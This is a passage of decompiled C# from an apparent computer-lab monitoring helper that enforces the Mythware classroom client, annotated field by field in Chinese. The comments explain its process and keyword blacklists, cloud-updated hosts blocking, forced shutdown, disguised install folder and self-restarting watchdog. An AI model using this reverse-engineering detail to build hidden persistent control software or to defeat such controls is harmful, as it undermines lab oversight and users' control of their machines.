		// (get) Token: 0x06000073 RID: 115 RVA: 0x0000242E File Offset: 0x0000062E
		// (set) Token: 0x06000074 RID: 116 RVA: 0x00006ED4 File Offset: 0x000050D4
		internal virtual global::System.Windows.Forms.Timer Timer_jiyu
		{
			[CompilerGenerated]
			get
			{
				return this._TokenEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.极域监控);
				global::System.Windows.Forms.Timer timer = this._TokenEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._TokenEvent = value;
				timer = this._TokenEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer3</c>（1000 ms）——建了但<b>没有事件处理器</b>，空转。</summary>
		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000075 RID: 117 RVA: 0x00002436 File Offset: 0x00000636
		// (set) Token: 0x06000076 RID: 118 RVA: 0x0000243E File Offset: 0x0000063E
		internal virtual global::System.Windows.Forms.Timer Timer3 { get; set; }

		/// <summary><c>Timer_updatehosts</c>（30000 ms）——后台持续刷新 hosts 黑名单。</summary>
		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000077 RID: 119 RVA: 0x00002447 File Offset: 0x00000647
		// (set) Token: 0x06000078 RID: 120 RVA: 0x00006F18 File Offset: 0x00005118
		internal virtual global::System.Windows.Forms.Timer Timer_updatehosts
		{
			[CompilerGenerated]
			get
			{
				return this.m_ServerEvent;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.定时刷新hosts);
				global::System.Windows.Forms.Timer timer = this.m_ServerEvent;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this.m_ServerEvent = value;
				timer = this.m_ServerEvent;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		/// <summary><c>Timer_route</c>（11000 ms）——建了但<b>没有事件处理器</b>，空转（黑洞路由由 hosts 刷新那条链路加）。</summary>
		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000079 RID: 121 RVA: 0x0000244F File Offset: 0x0000064F
		// (set) Token: 0x0600007A RID: 122 RVA: 0x00002457 File Offset: 0x00000657
		internal virtual global::System.Windows.Forms.Timer Timer_route { get; set; }

		/// <summary>常量 0，<b>全类没有被引用过</b>，语义无法推断，沿用原名。</summary>
		// Token: 0x04000011 RID: 17
		private const int _PropertyEvent = 0;

		/// <summary>常量 5，<b>全类没有被引用过</b>，语义无法推断，沿用原名。</summary>
		// Token: 0x04000012 RID: 18
		private const int m_ExceptionEvent = 5;

		/// <summary>主循环计数——<c>Timer_main</c> 每次心跳 +1，1 / 4 / 5 / 6 各触发一个启动阶段。</summary>
		// Token: 0x04000013 RID: 19
		private long 主循环计数;

		/// <summary>只在构造函数里被置 0，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x04000014 RID: 20
		private long _AnnotationEvent;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000015 RID: 21
		private bool _ProxyEvent;

		/// <summary>网线告警中——断网已经弹过 Form3，恢复后用来收窗。</summary>
		// Token: 0x04000016 RID: 22
		private bool 网线告警中;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000017 RID: 23
		private bool _ReponseEvent;

		/// <summary>进程缺失标志——电子教室已判过 NotFound，进程恢复时用来收 Form3。</summary>
		// Token: 0x04000018 RID: 24
		private bool 进程缺失标志;

		/// <summary>防火墙告警中——已经弹过 Form3，防火墙被关掉后用来收窗。</summary>
		// Token: 0x04000019 RID: 25
		private bool 防火墙告警中;

		/// <summary>极域参数告警中——<c>ChannelId</c>/<c>AutoLogin</c> 被改时置真。</summary>
		// Token: 0x0400001A RID: 26
		private bool 极域参数告警中;

		/// <summary>极域服务告警中——两个服务不存在/被停时置真。</summary>
		// Token: 0x0400001B RID: 27
		private bool 极域服务告警中;

		/// <summary>口令告警中——退出小助手的口令摘要被改时置真。</summary>
		// Token: 0x0400001C RID: 28
		private bool 口令告警中;

		/// <summary>IP 告警中——学生改了 IP 时置真。</summary>
		// Token: 0x0400001D RID: 29
		private bool IP告警中;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x0400001E RID: 30
		private bool connectionEvent;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x0400001F RID: 31
		private bool m_ListEvent;

		/// <summary>杀毒检查开关——注册表 <c>HKCU\Software\jfglzs\shadu_jianche</c>，为 <c>off</c> 时放行火绒托盘。</summary>
		// Token: 0x04000020 RID: 32
		private string 杀毒检查开关;

		/// <summary>U 盘检查开关——注册表 <c>usb_jianche</c>，为 <c>on</c> 才启动 U 盘监控。</summary>
		// Token: 0x04000021 RID: 33
		private string U盘检查开关;

		/// <summary>命令提示符检查开关——注册表 <c>cmd_jianche</c>，为 <c>off</c> 时关键词匹配跳过前 3 项。</summary>
		// Token: 0x04000022 RID: 34
		private string 命令提示符检查开关;

		/// <summary>电子教室配置串——注册表 <c>HKCU\Software\jfglzs\dzjs</c>，逗号分隔。</summary>
		// Token: 0x04000023 RID: 35
		private string 电子教室配置串;

		/// <summary>电子教室进程表——配置串按逗号拆开的结果，长度 6。</summary>
		// Token: 0x04000024 RID: 36
		private string[] 电子教室进程表;

		/// <summary>进程名黑名单——定长 101，实际填 1~28 项；匹配时用 <c>"|" + 大写进程名</c> 做子串匹配。</summary>
		// Token: 0x04000025 RID: 37
		private string[] 进程名黑名单;

		/// <summary>
		/// 关键词黑名单——定长 501，初始填 1~78 项；
		/// 匹配对象是进程文件的「产品名 + 文件说明」。<b>云端名单可以把「产品名：」段追加进来</b>。
		/// </summary>
		// Token: 0x04000026 RID: 38
		private string[] 关键词黑名单;

		/// <summary>关键词表上界——初始 78，云端名单每追加一条就往后长。</summary>
		// Token: 0x04000027 RID: 39
		private int 关键词表上界;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000028 RID: 40
		private string _ObserverEvent;

		/// <summary>备份程序路径——电子教室程序路径 + <c>"2"</c>，主程序文件缺失时从这里复制回去。</summary>
		// Token: 0x04000029 RID: 41
		private string 备份程序路径;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x0400002A RID: 42
		private int codeEvent;

		/// <summary>监控模式——0 = 不监控；1 = 按进程名逐个查；2 = 带完整路径，走状态机。</summary>
		// Token: 0x0400002B RID: 43
		private int 监控模式;

		/// <summary>只在构造函数里被置成空串，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x0400002C RID: 44
		private string m_IndexerEvent;

		/// <summary>防火墙告警计数——累计发现防火墙开着的次数，&gt;5 升级到 Form2。</summary>
		// Token: 0x0400002D RID: 45
		private int 防火墙告警计数;

		/// <summary>网络告警计数——断网 / IP 变更的累计次数，&gt;5 升级到 Form2。</summary>
		// Token: 0x0400002E RID: 46
		private int 网络告警计数;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x0400002F RID: 47
		private int _BaseEvent;

		/// <summary>进程缺失计数——电子教室 NotFound 的累计次数，<b>≥5 触发强制关机</b>。</summary>
		// Token: 0x04000030 RID: 48
		private int 进程缺失计数;

		/// <summary>进程挂起计数——电子教室被挂起/无响应的累计次数，&gt;8 弹 Form3、&gt;10 升级 Form2。</summary>
		// Token: 0x04000031 RID: 49
		private int 进程挂起计数;

		/// <summary>口令篡改计数——<c>HKCU\Software\n</c> 与快照不一致的累计次数，&gt;25 升级 Form2。</summary>
		// Token: 0x04000032 RID: 50
		private int 口令篡改计数;

		/// <summary>极域参数篡改计数——<c>ChannelId</c>/<c>AutoLogin</c> 被改的累计次数，&gt;5 升级 Form2。</summary>
		// Token: 0x04000033 RID: 51
		private int 极域参数篡改计数;

		/// <summary>极域服务告警计数——两个服务缺失/被停的累计次数，&gt;5 升级 Form2。</summary>
		// Token: 0x04000034 RID: 52
		private int 极域服务告警计数;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000035 RID: 53
		private int candidateEvent;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000036 RID: 54
		private int prototypeEvent;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000037 RID: 55
		private int m_AccountEvent;

		/// <summary>只在构造函数里被置 0，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x04000038 RID: 56
		private long collectionEvent;

		/// <summary>极域通道号快照——极域 <c>ChannelId</c> 的基线值。</summary>
		// Token: 0x04000039 RID: 57
		private int 极域通道号快照;

		/// <summary>极域自登录快照——极域 <c>AutoLogin</c> 的基线值。</summary>
		// Token: 0x0400003A RID: 58
		private int 极域自登录快照;

		/// <summary>极域注册表分支——0 = 没探测到；1 = <c>Wow6432Node</c> 视图；2 = 32 位视图。</summary>
		// Token: 0x0400003B RID: 59
		private int 极域注册表分支;

		/// <summary>极域服务受管——<c>tdfilefilter</c> 与 <c>tdnetfilter</c> 两个服务都在跑才为真。</summary>
		// Token: 0x0400003C RID: 60
		private bool 极域服务受管;

		/// <summary>口令摘要快照——<c>HKCU\Software\n</c> 的基线（<c>SHA256(口令 + "bfdshgs")</c>）。</summary>
		// Token: 0x0400003D RID: 61
		private string 口令摘要快照;

		/// <summary>prozs 自启动快照——<c>Run\prozs</c> 的基线值。</summary>
		// Token: 0x0400003E RID: 62
		private string prozs自启动快照;

		/// <summary>jfglzsn 自启动快照——<c>Run\jfglzsn</c> 的基线值。</summary>
		// Token: 0x0400003F RID: 63
		private string jfglzsn自启动快照;

		/// <summary>伪装安装目录——<c>C:\Program Files (x86)\&lt;5 字符随机名的第 2~5 位&gt;</c>。</summary>
		// Token: 0x04000040 RID: 64
		private string 伪装安装目录;

		/// <summary>tdfilefilter 服务——极域两个服务之一，被监控、会被强行 <c>Start()</c>。</summary>
		// Token: 0x04000041 RID: 65
		private ServiceController tdfilefilter服务;

		/// <summary>tdnetfilter 服务——极域两个服务之一，被监控、会被强行 <c>Start()</c>。</summary>
		// Token: 0x04000042 RID: 66
		private ServiceController tdnetfilter服务;

		/// <summary>原始 IP——第一次取到的合法有线网卡 IP，之后 IP 一变就拿它比对。</summary>
		// Token: 0x04000043 RID: 67
		private string 原始IP;

		/// <summary>关键词匹配下标——第二轮（文件属性关键词）命中的下标。</summary>
		// Token: 0x04000044 RID: 68
		private int 关键词匹配下标;

		/// <summary>解压拦截开关——注册表 <c>gaowei</c>，默认 2；等于 1 时不杀解压软件。</summary>
		// Token: 0x04000045 RID: 69
		private int 解压拦截开关;

		/// <summary>载荷源目录——<c>C:\windows\jf</c>，<c>zmserv.dat</c> / <c>przs.dat</c> 放这里。</summary>
		// Token: 0x04000046 RID: 70
		private string 载荷源目录;

		/// <summary>hosts 已写入——本轮名单已经成功接管 hosts，之后只做备份、不再重复写。</summary>
		// Token: 0x04000047 RID: 71
		private bool hosts已写入;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000048 RID: 72
		private string _ParamEvent;

		/// <summary><b>从未被读写</b>，沿用原名。</summary>
		// Token: 0x04000049 RID: 73
		private string regEvent;

		/// <summary>hosts 路径——<c>C:\Windows\System32\drivers\etc\hosts</c>（备份是它后面加 <c>"2"</c>）。</summary>
		// Token: 0x0400004A RID: 74
		private string hosts路径;

		/// <summary>进程名匹配下标——第一轮（进程名黑名单）命中的下标，决定分档处置。</summary>
		// Token: 0x0400004B RID: 75
		private int 进程名匹配下标;

		/// <summary>
		/// 设备变更消息相关常量（<c>WM_DEVICECHANGE</c> 与各 <c>DBT_*</c>）。
		/// <b>本工程只声明、没有任何地方引用</b>——U 盘管控最终走的是注册表 <c>usbstor\Start</c> 那条路。
		/// </summary>
		// Token: 0x0400004C RID: 76
		public const int WM_DEVICECHANGE = 537;

		// Token: 0x0400004D RID: 77
		public const int DBT_DEVICEARRIVAL = 32768;

		// Token: 0x0400004E RID: 78
		public const int DBT_CONFIGCHANGECANCELED = 25;

		// Token: 0x0400004F RID: 79
		public const int DBT_CONFIGCHANGED = 24;

		// Token: 0x04000050 RID: 80
		public const int DBT_CUSTOMEVENT = 32774;

		// Token: 0x04000051 RID: 81
		public const int DBT_DEVICEQUERYREMOVE = 32769;

		// Token: 0x04000052 RID: 82
		public const int DBT_DEVICEQUERYREMOVEFAILED = 32770;

		// Token: 0x04000053 RID: 83
		public const int DBT_DEVICEREMOVECOMPLETE = 32772;

		// Token: 0x04000054 RID: 84
		public const int DBT_DEVICEREMOVEPENDING = 32771;

		// Token: 0x04000055 RID: 85
		public const int DBT_DEVICETYPESPECIFIC = 32773;

		// Token: 0x04000056 RID: 86
		public const int DBT_DEVNODES_CHANGED = 7;

		// Token: 0x04000057 RID: 87
		public const int DBT_QUERYCHANGECONFIG = 23;

		// Token: 0x04000058 RID: 88
		public const int DBT_USERDEFINED = 65535;

		/// <summary>新进程监视器——WMI <c>ManagementEventWatcher</c>，挂 <see cref="新进程拦截"/>，窗体关闭时停掉。</summary>
		// Token: 0x04000059 RID: 89
		private ManagementEventWatcher 新进程监视器;

		/// <summary>触发进程名——WMI 事件里带过来的进程名（带 <c>.exe</c>）。</summary>
		// Token: 0x0400005A RID: 90
		private string 触发进程名;

		/// <summary>电子教室进程名——配置串首项去掉扩展名的结果，全类用它查进程。</summary>
		// Token: 0x0400005B RID: 91
		private string 电子教室进程名;

		/// <summary>电子教室程序路径——配置串首项（完整路径），缺失时用来补文件、拉起。</summary>
		// Token: 0x0400005C RID: 92
		private string 电子教室程序路径;

		/// <summary>云端域名——注册表 <c>HKCU\Software\jfglzs\zhuye</c>，拼成 <c>http://&lt;域名&gt;/hmd_net.txt</c>。</summary>
		// Token: 0x0400005D RID: 93
		private string 云端域名;

		/// <summary>关机特权号 19 = <c>SeShutdownPrivilege</c>，<see cref="强制关机"/> 用；其它地方没有引用。</summary>
		// Token: 0x0400005E RID: 94
		private const int recordEvent = 19;

		/// <summary>常量 0，<b>全类没有被引用过</b>，沿用原名。</summary>
		// Token: 0x0400005F RID: 95
		private const int m_MessageEvent = 0;

		/// <summary>常量 1，<b>全类没有被引用过</b>，沿用原名。</summary>
		// Token: 0x04000060 RID: 96
		private const int m_RefEvent = 1;

		/// <summary>常量 2，<b>全类没有被引用过</b>，沿用原名。</summary>
		// Token: 0x04000061 RID: 97
		private const int m_AttrEvent = 2;

		/// <summary>常量 2，正好是 <c>NtShutdownSystem</c> 的关机动作码 <c>ShutdownPowerOff</c>；<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000062 RID: 98
		private const int authenticationEvent = 2;

		/// <summary>字节常量 17，<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000063 RID: 99
		private const byte _PoolEvent = 17;

		/// <summary>字节常量 76（= 'L'），<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000064 RID: 100
		private const byte dispatcherEvent = 76;

		/// <summary>字节常量 67（= 'C'），<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000065 RID: 101
		private const byte m_IssuerEvent = 67;

		/// <summary>字节常量 87（= 'W'），<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000066 RID: 102
		private const byte m_ProccesorEvent = 87;

		/// <summary>字节常量 18，<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000067 RID: 103
		private const byte m_BroadcasterEvent = 18;

		/// <summary>字节常量 115（= 's'），<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000068 RID: 104
		private const byte configurationEvent = 115;

		/// <summary>字节常量 27，<b>没有被引用</b>，沿用原名。</summary>
		// Token: 0x04000069 RID: 105
		private const byte m_TagEvent = 27;

		/// <summary>只在构造函数里 new 出来，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x0400006A RID: 106
		private List<string> m_InvocationEvent;

		/// <summary>只在构造函数里 new 出来，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x0400006B RID: 107
		private List<string> _RequestEvent;

		/// <summary>只在构造函数里置成空串，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x0400006C RID: 108
		private string _SerializerEvent;

		/// <summary>只在构造函数里置 0，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x0400006D RID: 109
		private long m_GlobalEvent;

		/// <summary>拉起计数——守护副本 <c>przs.exe</c> 连续拉不起来的次数，<b>≥5 触发整条链自重启</b>。</summary>
		// Token: 0x0400006E RID: 110
		private long 拉起计数;

		/// <summary>只在构造函数里置成空串，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x0400006F RID: 111
		private string m_ExporterEvent;

		/// <summary>只在构造函数里置 <c>false</c>，<b>之后再没有被读写过</b>，沿用原名。</summary>
		// Token: 0x04000070 RID: 112
		private bool m_SchemaEvent;

		/// <summary>组件容器——14 个定时器都挂在它下面，<c>Dispose</c> 时一起释放。</summary>
		// Token: 0x04000071 RID: 113
		private IContainer 组件容器;

		// Token: 0x04000072 RID: 114
		[AccessedThroughProperty("Timer1")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer m_TestsEvent;

		// Token: 0x04000073 RID: 115
		[CompilerGenerated]
		[AccessedThroughProperty("Timer2")]
		private global::System.Windows.Forms.Timer m_ConsumerEvent;

		// Token: 0x04000074 RID: 116
		[AccessedThroughProperty("Timer_main")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer _RulesEvent;

		// Token: 0x04000075 RID: 117
		[CompilerGenerated]
		[AccessedThroughProperty("Timer_usb")]
		private global::System.Windows.Forms.Timer _ServiceEvent;

		// Token: 0x04000076 RID: 118
		[CompilerGenerated]
		[AccessedThroughProperty("Timer_dzjs")]
		private global::System.Windows.Forms.Timer m_RepositoryEvent;

		// Token: 0x04000077 RID: 119
		[CompilerGenerated]
		[AccessedThroughProperty("Timer_wangluo")]
		private global::System.Windows.Forms.Timer objectEvent;

		// Token: 0x04000078 RID: 120
		[CompilerGenerated]
		[AccessedThroughProperty("Timer_jcm")]
		private global::System.Windows.Forms.Timer m_PrinterEvent;

		// Token: 0x04000079 RID: 121
		[AccessedThroughProperty("Timer_fhq")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer _ConfigEvent;

		// Token: 0x0400007A RID: 122
		[AccessedThroughProperty("Timer_qdx")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer _ManagerEvent;

		// Token: 0x0400007B RID: 123
		[AccessedThroughProperty("Timer4")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer registryEvent;

		// Token: 0x0400007C RID: 124
		[AccessedThroughProperty("Timer_jiyu")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer _TokenEvent;

		// Token: 0x0400007D RID: 125
		[AccessedThroughProperty("Timer3")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer m_ContextEvent;

		// Token: 0x0400007E RID: 126
		[AccessedThroughProperty("Timer_updatehosts")]
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer m_ServerEvent;

		// Token: 0x0400007F RID: 127
		[CompilerGenerated]
		[AccessedThroughProperty("Timer_route")]
		private global::System.Windows.Forms.Timer m_WorkerEvent;

		/// <summary>
		/// 电子教室进程的状态。<see cref="CheckProcessStatus"/> 的返回值，驱动
		/// <see cref="电子教室进程监控"/> 的状态机。
		/// </summary>
		// Token: 0x0200000C RID: 12
		public enum ProcessStatus
		{
			/// <summary>进程在跑、有响应、没有线程被挂起。</summary>
			// Token: 0x04000081 RID: 129
			Running,
			/// <summary>进程还在，但有线程处于挂起等待（被"暂停"了）。</summary>
			// Token: 0x04000082 RID: 130
			Suspended,
			/// <summary>进程在，但窗口无响应。</summary>
			// Token: 0x04000083 RID: 131
			NotResponding,
			/// <summary>没有这个进程，或者同名进程的映像路径和 <see cref="电子教室程序路径"/> 对不上。</summary>
			// Token: 0x04000084 RID: 132
			NotFound
		}
	}
}
